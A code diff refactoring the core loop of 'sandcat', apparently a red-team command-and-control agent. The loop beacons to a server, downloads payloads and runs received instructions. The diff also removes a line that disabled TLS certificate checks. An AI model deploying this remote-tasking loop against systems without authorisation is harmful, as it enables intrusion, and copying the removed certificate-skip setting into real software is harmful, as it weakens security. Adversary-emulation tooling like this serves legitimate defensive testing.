@@ -1,10 +1,8 @@
 package core
 
 import (
-	"crypto/tls"
 	"encoding/json"
 	"fmt"
-	"net/http"
 	"reflect"
 	"time"
 
@@ -15,23 +13,20 @@ import (
 )
 
 // Initializes and returns sandcat agent.
-func initializeCore(server string, group string,c2 map[string]string, p2pReceiversOn bool, verbose bool) (*agent.Agent, error) {
+func initializeCore(server string, group string,c2 map[string]string, p2pReceiversOn bool, initialDelay int, verbose bool) (*agent.Agent, error) {
 	output.SetVerbose(verbose)
 	output.VerbosePrint("Starting sandcat in verbose mode.")
-	return agent.AgentFactory(server, group, c2, p2pReceiversOn)
+	return agent.AgentFactory(server, group, c2, p2pReceiversOn, initialDelay)
 }
 
 //Core is the main function as wrapped by sandcat.go
 func Core(server string, group string, delay int, c2 map[string]string, p2pReceiversOn bool, verbose bool) {
-	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
-	sandcatAgent, err := initializeCore(server, group, c2, p2pReceiversOn, verbose)
+	sandcatAgent, err := initializeCore(server, group, c2, p2pReceiversOn, delay, verbose)
 	if err != nil {
 		output.VerbosePrint(fmt.Sprintf("[-] Error when initializing agent: %s", err.Error()))
 		output.VerbosePrint("[-] Exiting.")
 	} else {
 		sandcatAgent.Display()
-		output.VerbosePrint(fmt.Sprintf("initial delay=%d", delay))
-		time.Sleep(time.Duration(float64(delay)) * time.Second)
 		runAgent(sandcatAgent, c2)
 		sandcatAgent.Terminate()
 	}
@@ -43,8 +38,6 @@ func runAgent (sandcatAgent *agent.Agent, c2Config map[string]string) {
 	watchdog := 0
 	checkin := time.Now()
 	for (evaluateWatchdog(checkin, watchdog)) {
-		// TODO - heartbeat will be incorporated later
-
 		// Send beacon and get response.
 		beacon := sandcatAgent.Beacon()
 
@@ -68,7 +61,7 @@ func runAgent (sandcatAgent *agent.Agent, c2Config map[string]string) {
 					output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", command["id"]))
 					droppedPayloads := sandcatAgent.DownloadPayloads(command["payloads"].([]interface{}))
 					go sandcatAgent.RunInstruction(command, droppedPayloads)
-					time.Sleep(time.Duration(command["sleep"].(float64)) * time.Second)
+					sandcatAgent.Sleep(command["sleep"].(float64))
 				}
 			}
 		} else {
@@ -79,7 +72,7 @@ func runAgent (sandcatAgent *agent.Agent, c2Config map[string]string) {
 			} else {
 				sleepDuration = float64(15)
 			}
-			time.Sleep(time.Duration(sleepDuration) * time.Second)
+			sandcatAgent.Sleep(sleepDuration)
 		}
 	}
 }
